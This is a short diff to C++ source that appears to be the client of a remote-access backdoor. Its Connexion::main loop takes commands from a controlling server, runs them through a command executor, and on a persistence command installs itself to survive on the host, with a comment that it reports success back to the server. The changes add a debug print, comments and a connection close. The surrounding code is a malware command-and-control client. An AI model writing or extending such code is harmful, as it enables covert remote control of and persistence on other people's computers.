@@ -121,12 +121,13 @@ int Connexion::main()
                 Exec().executeCommand(command.substr(8,command.length()));
                 
             }
-            else if (command.substr(0,23) =="MOD_LONELY_PERSISTENCE:")  
+            else if (command.substr(0,23) =="MOD_LONELY_PERSISTENCE:")   //A CHANGER !!!!!!
             {
+                cout << "IN mod persi " << endl;
                 //In mod persistence.
                 Persistence persistence(a_is_admin, a_path_prog);
 
-                if(command.substr(23,command.length()) =="default")
+                if(command.substr(23,command.length()) =="default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                 {
                     //cout << "Default persi" << endl;
                     persistence.main();
@@ -152,6 +153,7 @@ int Connexion::main()
                 cout << "send status" << endl;
                 cout << "bye... " << endl;
                 Sleep(2000);
+                closeConnexion();
                 exit(0);
                 
             }
